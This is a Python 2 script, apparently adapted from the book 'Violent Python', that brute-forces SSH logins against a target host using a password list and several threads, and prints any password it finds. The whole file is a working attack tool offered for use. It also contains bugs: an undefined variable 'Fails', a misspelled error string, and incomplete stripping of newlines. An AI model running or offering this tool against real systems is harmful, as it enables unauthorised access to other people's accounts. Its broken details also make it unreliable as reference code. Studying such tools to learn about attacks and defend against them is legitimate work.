##############################################################################
#
# SSH brute force from Violent Python
# This program connects to SSH service then attemtps brute force pwd attack
#
##############################################################################

import time
import pxssh
import optparse
from threading import *

max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
Found = False
Fail = 0


def conn(tgtHost, user, pwd, release):
    global Found
    global Fail

    try:
        s = pxssh.pxssh()
        s.login(tgtHost, user, pwd)
        print '[+] FUCK YEAH!!! Password found: ' + pwd
        Found = True 
        
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            conn(tgtHost, user, pwd, False)
        elif 'sychronize with original prompt' in str(e):
            time.sleep(5)
            conn(tgtHost, user, pwd, False)
    finally:
        if release: connection_lock.release()
            
        
        
def main():
    
    parser =  optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', type='string', dest='tgtHost', help='specify target host'  )
    parser.add_option('-u', type='string', dest='user', help='specify username')
    parser.add_option('-F', type='string', dest='pass_file', help='specify target pwd file')
    
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    user = options.user
    pass_file = options.pass_file
    
    if tgtHost == None or user == None or pass_file == None:
        print parser.usage
        exit(0)
     
     
    f = open(pass_file, 'r')
    
    for line in f.readlines():

        if Found == True:
            print '[*] Exiting program: Password found!!!'
            exit(0)
        if Fail > 5:
            print '[!] Exiting program. Too many connections'
            exit(0)
        
        connection_lock.acquire()
        pwd = line.strip('\r')
        print '[+] Testing password: ' + pwd
        #conn(tgtHost, user, line, True)
        t = Thread(target=conn, args=(tgtHost,user,pwd,True))
        t.start()
        

        
        




if __name__ == '__main__':
    main()